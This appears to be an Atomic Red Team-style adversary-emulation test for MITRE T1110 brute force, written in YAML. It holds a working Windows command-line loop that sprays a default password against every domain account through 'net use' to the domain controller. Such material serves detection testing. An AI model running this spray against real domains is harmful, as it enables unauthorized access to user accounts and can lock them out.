---
attack_technique: T1110
display_name: Brute Force Credential Access

atomic_tests:
- name: Domain Password Spray (Windows FOR Loop)
  auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
  description: |
    This test will attempt to authenticate to a domain controller with the specified password ('Spring2020' by default) for every user in the domain.
    Be careful to not lock out user accounts. Use 'net accounts /domain' to review the domain password lockout policy.
  supported_platforms:
    - windows
  input_arguments:
    password:
      description: Password to attempt for each users
      type: String
      default: Spring2020

  executor: 
    name: command_prompt
    elevation_required: false
    command: |
      PathToAtomicsFolder\T1110\src\create_user_list.bat
      @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:%userdomain%\%n "#{password}" 1>NUL 2>&1 & @echo . && @echo [*] %n && @net use /delete %logonserver%\IPC$ > NUL